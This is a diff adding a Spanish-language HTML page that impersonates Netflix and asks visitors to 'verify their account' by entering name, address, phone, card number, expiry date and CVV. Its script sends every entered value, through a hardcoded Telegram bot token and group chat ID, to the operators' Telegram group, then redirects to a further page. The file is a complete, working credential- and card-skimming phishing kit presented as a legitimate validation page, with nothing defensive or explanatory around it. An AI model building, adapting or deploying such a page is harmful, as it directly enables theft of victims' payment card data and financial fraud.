@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Validación de Netflix</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html, body {
+      min-height: 100vh;
+      font-family: 'Arial', sans-serif;
+      background: url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: white;
+      display: flex;
+      flex-direction: column;
+    }
+    .header {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      padding: 20px;
+    }
+    .header img {
+      width: 120px;
+    }
+    .container {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      width: 100%;
+      padding: 20px;
+      background: rgba(0,0,0,0.75);
+    }
+    form {
+      background: rgba(0,0,0,0.8);
+      padding: 30px;
+      border-radius: 8px;
+      width: 100%;
+      max-width: 400px;
+    }
+    h1, h2, p {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      font-size: 14px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: none;
+      border-radius: 5px;
+      background: #333;
+      color: white;
+      font-size: 16px;
+    }
+    .exp-row {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    .exp-row input {
+      flex: 1;
+    }
+    .payment-logos {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .payment-logos img {
+      width: 150px;
+      height: auto;
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background-color: #e50914;
+      border: none;
+      font-size: 18px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    button:hover {
+      background-color: #f6121d;
+    }
+  </style>
+</head>
+<body>
+
+<div class="header">
+  <img src="logo.png" alt="Netflix">
+</div>
+
+<div class="container">
+  <form id="payment-form">
+    <h1>Verifica tu cuenta</h1>
+    <p>Por favor, completa tu información.</p>
+    
+    <h2>Información personal</h2>
+    <label>Nombre</label>
+    <input type="text" id="firstName" required>
+
+    <label>Apellido</label>
+    <input type="text" id="lastName" required>
+
+    <label>Dirección</label>
+    <input type="text" id="address" required>
+
+    <label>Código postal</label>
+    <input type="text" id="zip" required>
+
+    <label>Número de teléfono</label>
+    <input type="text" id="phone" required>
+
+    <h2>Detalles de pago</h2>
+
+    <div class="payment-logos">
+      <img src="paiement.png" alt="Logos de pago seguro">
+    </div>
+
+    <label>Número de tarjeta</label>
+    <input type="text" id="cardNumber" required>
+
+    <label>Fecha de expiración (MM/AA) y CVV</label>
+    <div class="exp-row">
+      <input type="text" id="expMonth" placeholder="MM" required>
+      <input type="text" id="expYear" placeholder="AA" required>
+      <input type="text" id="cvv" placeholder="CVV" required>
+    </div>
+
+    <button type="submit">Continuar</button>
+  </form>
+</div>
+
+<script>
+// Token et Chat ID (groupe)
+const botToken = "7991899427:AAGm5oI3Hiq1g0qtew_CKbEh28_YcbH7JRY";
+const chatId = "-4890781004";
+
+document.getElementById('payment-form').addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  const firstName = document.getElementById('firstName').value;
+  const lastName = document.getElementById('lastName').value;
+  const address = document.getElementById('address').value;
+  const zip = document.getElementById('zip').value;
+  const phone = document.getElementById('phone').value;
+  const cardNumber = document.getElementById('cardNumber').value;
+  const expMonth = document.getElementById('expMonth').value;
+  const expYear = document.getElementById('expYear').value;
+  const cvv = document.getElementById('cvv').value;
+
+  const text = `💳 Validation Netflix :\n\n👤 Prénom : ${firstName}\n👤 Nom : ${lastName}\n🏡 Adresse : ${address}\n📮 Code postal : ${zip}\n📞 Téléphone : ${phone}\n\n💳 Carte : ${cardNumber}\n📅 Expiration : ${expMonth}/${expYear}\n🔒 CVV : ${cvv}\n\n🧾 Préparez-vous pour Apple Pay`;
+
+  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+    .then(response => {
+      if (response.ok) {
+        window.location.href = "page3.html";
+      } else {
+        alert("Erreur lors de l'envoi.");
+      }
+    })
+    .catch(error => {
+      alert("Erreur réseau.");
+      console.error(error);
+    });
+});
+</script>
+
+</body>
+</html>
